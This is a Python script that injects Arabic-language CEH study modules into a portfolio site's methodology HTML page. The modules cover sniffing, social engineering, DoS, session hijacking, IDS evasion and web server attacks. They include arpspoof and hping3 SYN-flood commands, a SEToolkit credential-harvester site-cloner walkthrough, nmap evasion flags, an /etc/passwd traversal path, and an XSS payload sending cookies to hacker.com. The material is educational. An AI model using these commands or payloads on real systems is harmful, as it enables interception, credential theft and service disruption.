import os
import re

html_path = r"d:\abdo_portfolio\main\templates\main\methodology.html"
with open(html_path, "r", encoding="utf-8") as f:
    content = f.read()

# 1. Add sidebar category
sidebar_ceh = """
      <!-- Category 7: CEH MASTERCLASS (MISSING MODULES) -->
      <div class="sidebar-category">
        <div class="category-title" onclick="toggleCategory('cat-ceh')">
          <span>🎓 CEH MASTERCLASS</span>
          <span>▼</span>
        </div>
        <div class="category-items" id="cat-ceh" style="display: none;">
          <div class="meth-item" id="meth-ef-ceh_sniff" onclick="openMethPhase('ceh_sniff')" data-search="sniffing wireshark tcpdump arp poisoning mitm">
            <span>├── 🕵️</span> <span>M8: Sniffing</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_sniff', '🕵️ M8: Sniffing')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-ceh_se" onclick="openMethPhase('ceh_se')" data-search="social engineering phishing settoolkit">
            <span>├── 🎭</span> <span>M9: Social Eng.</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_se', '🎭 M9: Social Eng.')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-ceh_dos" onclick="openMethPhase('ceh_dos')" data-search="dos ddos denial of service botnet amplification">
            <span>├── 💣</span> <span>M10: DoS Attacks</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_dos', '💣 M10: DoS Attacks')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-ceh_hijack" onclick="openMethPhase('ceh_hijack')" data-search="session hijacking tcp csrf xss">
            <span>├── 🔓</span> <span>M11: Session Hijack</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_hijack', '🔓 M11: Session Hijack')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-ceh_evade" onclick="openMethPhase('ceh_evade')" data-search="evading ids firewalls honeypots nmap fragmentation">
            <span>├── 🛡️</span> <span>M12: Evade IDS/FW</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_evade', '🛡️ M12: Evade IDS/FW')">★</button>
          </div>
          <div class="meth-item" id="meth-ef-ceh_webserver" onclick="openMethPhase('ceh_webserver')" data-search="hacking web servers iis apache misconfiguration">
            <span>└── 🌐</span> <span>M13: Web Servers</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'ceh_webserver', '🌐 M13: Web Servers')">★</button>
          </div>
        </div>
      </div>
"""

# Insert right after the OSCP MASTERCLASS sidebar category ends
oscp_pattern = re.compile(r'(<!-- Category 6: OSCP MASTERCLASS -->.*?</div>\s*</div>\s*</div>)', re.DOTALL)
content = oscp_pattern.sub(r'\1\n' + sidebar_ceh, content)

# 2. Prepare CEH Content Divs
ceh_content = """

      <!-- CEH Module 8: Sniffing -->
      <div class="meth-content-view" id="meth-content-ceh_sniff" style="display: none; --tool-color: #0284c7;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🕵️</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 8: Sniffing</h1>
            <p class="phase-module-tagline">اعتراض وتحليل حركة مرور الشبكة لسرقة البيانات غير المشفرة</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🔴 High Risk</span>
              <span class="badge badge-tool">🔧 Wireshark · Ettercap</span>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>مفاهيم التنصت (Sniffing Concepts)</h3></div>
          <ul>
            <li><strong>Passive Sniffing:</strong> يحدث في الشبكات التي تستخدم Hubs، حيث يتم بث البيانات للجميع، والمهاجم يستمع فقط.</li>
            <li><strong>Active Sniffing:</strong> يحدث في الشبكات التي تستخدم Switches. المهاجم يحتاج لتنفيذ هجمات مثل ARP Poisoning لتوجيه البيانات إليه.</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>هجمات الشبكة (Network Attacks)</h3></div>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">ARP Poisoning (Man-in-the-Middle)</span></div>
            <pre><code>arpspoof -i eth0 -t &lt;Target_IP&gt; &lt;Gateway_IP&gt;
arpspoof -i eth0 -t &lt;Gateway_IP&gt; &lt;Target_IP&gt;</code></pre>
          </div>
          <ul>
            <li><strong>MAC Flooding:</strong> إرسال آلاف عناوين MAC المزيفة للـ Switch لملء جدول CAM، مما يجبره على التصرف كـ Hub وبث البيانات لجميع المنافذ (أداة <code>macof</code>).</li>
            <li><strong>DHCP Starvation:</strong> استنزاف جميع عناوين IP من خادم DHCP باستخدام أداة مثل Yersinia.</li>
            <li><strong>DNS Poisoning:</strong> حقن إدخالات DNS مزيفة في ذاكرة تخزين DNS لتوجيه المستخدمين لمواقع خبيثة.</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أدوات التنصت (Sniffing Tools)</h3></div>
          <table class="tools-table">
            <thead>
              <tr><th>الأداة</th><th>الغرض</th></tr>
            </thead>
            <tbody>
              <tr><td>Wireshark</td><td>التقاط وتحليل حزم الشبكة في الوقت الفعلي بواجهة رسومية</td></tr>
              <tr><td>tcpdump</td><td>التقاط الحزم من سطر الأوامر</td></tr>
              <tr><td>Ettercap</td><td>أداة شاملة لهجمات Man-in-the-Middle واعتراض كلمات المرور</td></tr>
              <tr><td>Cain & Abel</td><td>أداة Windows كلاسيكية للتنصت وكسر كلمات المرور</td></tr>
              <tr><td>Bettercap</td><td>الإصدار الأحدث والأقوى من Ettercap</td></tr>
              <tr><td>sslstrip</td><td>إجبار الضحية على استخدام HTTP بدلاً من HTTPS لسرقة البيانات</td></tr>
            </tbody>
          </table>
        </div>
      </div>

      <!-- CEH Module 9: Social Engineering -->
      <div class="meth-content-view" id="meth-content-ceh_se" style="display: none; --tool-color: #ef4444;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🎭</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 9: Social Engineering</h1>
            <p class="phase-module-tagline">استغلال العنصر البشري لتجاوز الإجراءات الأمنية</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🔴 High Risk</span>
              <span class="badge badge-tool">🔧 SET · GoPhish</span>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أنواع الهندسة الاجتماعية (Types of SE)</h3></div>
          <div class="info-duo">
            <div class="info-box what">
              <h5>👤 Human-Based</h5>
              <ul>
                <li><strong>Tailgating/Piggybacking:</strong> الدخول خلف شخص مصرح له للمبنى.</li>
                <li><strong>Dumpster Diving:</strong> البحث في سلة المهملات عن مستندات أو كلمات مرور.</li>
                <li><strong>Shoulder Surfing:</strong> استراق النظر لشاشة أو كيبورد الضحية.</li>
                <li><strong>Impersonation:</strong> انتحال شخصية موظف IT أو فني صيانة.</li>
              </ul>
            </div>
            <div class="info-box goal">
              <h5>💻 Computer-Based</h5>
              <ul>
                <li><strong>Phishing:</strong> إرسال بريد إلكتروني احتيالي.</li>
                <li><strong>Spear Phishing:</strong> تصيد مستهدف لشخص محدد.</li>
                <li><strong>Whaling:</strong> تصيد لكبار المدراء (CEO/CFO).</li>
                <li><strong>Baiting:</strong> ترك USB مصاب عمداً ليجده الضحية.</li>
              </ul>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>استخدام SET (Social Engineering Toolkit)</h3></div>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">Credential Harvester Attack</span></div>
            <pre><code>setoolkit
> 1) Social-Engineering Attacks
> 2) Website Attack Vectors
> 3) Credential Harvester Attack Method
> 2) Site Cloner
> [Enter IP for reverse connection]
> [Enter URL to clone (e.g., https://facebook.com)]</code></pre>
          </div>
        </div>
      </div>

      <!-- CEH Module 10: Denial of Service -->
      <div class="meth-content-view" id="meth-content-ceh_dos" style="display: none; --tool-color: #f59e0b;">
        <div class="phase-module-header">
          <div class="phase-module-icon">💣</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 10: Denial-of-Service</h1>
            <p class="phase-module-tagline">تعطيل الخدمات والشبكات ومنع المستخدمين الشرعيين من الوصول</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🟡 Medium Risk</span>
              <span class="badge badge-tool">🔧 hping3 · Slowloris</span>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>مفاهيم وتقنيات DoS</h3></div>
          <ul>
            <li><strong>Volumetric Attacks:</strong> استنزاف النطاق الترددي (Bandwidth) مثل UDP/ICMP Flood.</li>
            <li><strong>Protocol Attacks:</strong> استنزاف موارد الشبكة/الخادم مثل SYN Flood.</li>
            <li><strong>Application Layer Attacks:</strong> استنزاف موارد التطبيق مثل HTTP GET/POST Flood و Slowloris.</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>هجمات التضخيم (Amplification Attacks)</h3></div>
          <p>يستخدم المهاجم خوادم عامة (مثل DNS, NTP, Memcached) لإرسال طلبات صغيرة بـ IP مزور (مجهول) يحمل IP الضحية، فترد الخوادم بحزم بيانات ضخمة جداً على الضحية، مما يؤدي لتضخيم الهجوم لمئات الأضعاف.</p>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">SYN Flood using hping3</span></div>
            <pre><code>hping3 -S --flood -V -p 80 &lt;Target_IP&gt;</code></pre>
          </div>
        </div>
      </div>

      <!-- CEH Module 11: Session Hijacking -->
      <div class="meth-content-view" id="meth-content-ceh_hijack" style="display: none; --tool-color: #8b5cf6;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🔓</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 11: Session Hijacking</h1>
            <p class="phase-module-tagline">اختطاف جلسات المستخدمين للوصول غير المصرح للأنظمة والتطبيقات</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🟡 Medium Risk</span>
              <span class="badge badge-tool">🔧 Burp Suite · OWASP ZAP</span>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>مستويات اختطاف الجلسات</h3></div>
          <ul>
            <li><strong>Network Level Hijacking:</strong> اختطاف جلسات TCP والتنبؤ بأرقام Sequence و Acknowledgment. مثل IP Spoofing و RST Hijacking.</li>
            <li><strong>Application Level Hijacking:</strong> سرقة أو التنبؤ بـ Session Token للويب.</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>تقنيات اختطاف جلسات الويب</h3></div>
          <ul>
            <li><strong>Session Sniffing:</strong> اعتراض الـ Token غير المشفر باستخدام Wireshark.</li>
            <li><strong>Session Fixation:</strong> يقوم المهاجم بفرض Session ID معروف مسبقاً على الضحية، وعند تسجيل دخول الضحية، يصبح المهاجم قادراً على استخدام الحساب.</li>
            <li><strong>XSS Attack:</strong> سرقة الكوكيز عبر حقن جافاسكريبت: <code>&lt;script&gt;fetch('http://hacker.com/log?c='+document.cookie)&lt;/script&gt;</code></li>
          </ul>
        </div>
      </div>

      <!-- CEH Module 12: Evading IDS/FW -->
      <div class="meth-content-view" id="meth-content-ceh_evade" style="display: none; --tool-color: #10b981;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🛡️</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 12: Evading IDS, Firewalls & Honeypots</h1>
            <p class="phase-module-tagline">تقنيات التخفي لتجاوز أنظمة الكشف والحماية</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🔴 High Risk</span>
              <span class="badge badge-tool">🔧 Nmap · Fragroute</span>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>تقنيات التجاوز (Evasion Techniques)</h3></div>
          <table class="tools-table">
            <thead>
              <tr><th>التقنية</th><th>الوصف والأوامر</th></tr>
            </thead>
            <tbody>
              <tr>
                <td>Packet Fragmentation</td>
                <td>تجزئة الحزم لتجاوز بصمات الـ IDS. <br><code>nmap -f &lt;Target_IP&gt;</code></td>
              </tr>
              <tr>
                <td>Decoy Scanning</td>
                <td>توليد حركة مرور من IPs وهمية لإخفاء المصدر الحقيقي. <br><code>nmap -D RND:10 &lt;Target_IP&gt;</code></td>
              </tr>
              <tr>
                <td>Source Port Manipulation</td>
                <td>استخدام منفذ مصدر موثوق (مثل 53 أو 80) لتجاوز الجدار الناري. <br><code>nmap -g 53 &lt;Target_IP&gt;</code></td>
              </tr>
              <tr>
                <td>MAC Spoofing</td>
                <td>تغيير عنوان الـ MAC لتجاوز أنظمة التصفية المعتمدة على MAC. <br><code>nmap --spoof-mac 0 &lt;Target_IP&gt;</code></td>
              </tr>
              <tr>
                <td>Obfuscation / Encoding</td>
                <td>تشفير حمولات الهجوم (Payloads) لتجاوز أنظمة الكشف المعتمدة على الـ Signatures.</td>
              </tr>
            </tbody>
          </table>
        </div>
        
        <div class="cyber-card">
          <div class="card-header"><h3>أفخاخ المخترقين (Honeypots)</h3></div>
          <p>الـ Honeypot هو نظام وهمي مصمم لجذب المهاجمين لدراسة أساليبهم. لتجنب الـ Honeypots، يجب فحص الخدمات بعناية وتجنب مهاجمة الأجهزة التي تبدو وكأنها تحتوي على العديد من الثغرات بشكل مصطنع أو تمتلك أوقات استجابة غير منطقية للشبكة.</p>
        </div>
      </div>

      <!-- CEH Module 13: Web Servers -->
      <div class="meth-content-view" id="meth-content-ceh_webserver" style="display: none; --tool-color: #ffb020;">
        <div class="phase-module-header">
          <div class="phase-module-icon">🌐</div>
          <div class="phase-module-meta">
            <h1 class="phase-module-title">CEH Module 13: Hacking Web Servers</h1>
            <p class="phase-module-tagline">استهداف البنية التحتية لخادم الويب نفسه (Apache, IIS) بدلاً من التطبيق</p>
            <div class="phase-meta-badges">
              <span class="badge badge-medium">🟡 Medium Risk</span>
              <span class="badge badge-tool">🔧 Nikto · Uniscan</span>
            </div>
          </div>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>ثغرات وهجمات خوادم الويب</h3></div>
          <ul>
            <li><strong>Directory Traversal:</strong> استغلال مسارات غير آمنة للوصول إلى ملفات حساسة خارج مجلد الويب (مثل <code>../../../../etc/passwd</code>).</li>
            <li><strong>Web Server Misconfiguration:</strong> مثل ترك صفحات الإدارة الافتراضية، التصفح المفتوح للمجلدات (Directory Listing)، ومعلومات الخطأ التفصيلية.</li>
            <li><strong>HTTP Response Splitting:</strong> حقن ترويسات استجابة إضافية عن طريق التلاعب بالمدخلات التي يعيدها الخادم في الترويسة.</li>
            <li><strong>Web Cache Poisoning:</strong> تسميم ذاكرة التخزين المؤقت (Cache) لتقديم صفحات خبيثة لجميع الزوار.</li>
            <li><strong>HTTP Verb Tampering:</strong> استغلال أفعال HTTP غير المتوقعة (مثل PUT, DELETE, TRACE) التي قد يسمح بها الخادم عن طريق الخطأ.</li>
          </ul>
        </div>

        <div class="cyber-card">
          <div class="card-header"><h3>أدوات الفحص</h3></div>
          <div class="cmd-block">
            <div class="cmd-header"><span class="cmd-lang">Nikto Web Scanner</span></div>
            <pre><code>nikto -h http://&lt;Target_IP&gt;</code></pre>
          </div>
        </div>
      </div>

"""

# Insert the CEH content divs before the closing tag of meth-viewer
# Find the last closing div of meth-viewer.
# A safe way is to find the closing tag of the oscp_strat div, then insert our CEH content
strat_pattern = re.compile(r'(<div class="meth-content-view" id="meth-content-oscp_strat".*?</div>\s*</div>\s*</div>\s*</div>)', re.DOTALL)
content = strat_pattern.sub(r'\1\n' + ceh_content, content)

with open(html_path, "w", encoding="utf-8") as f:
    f.write(content)

print("CEH modules successfully injected.")
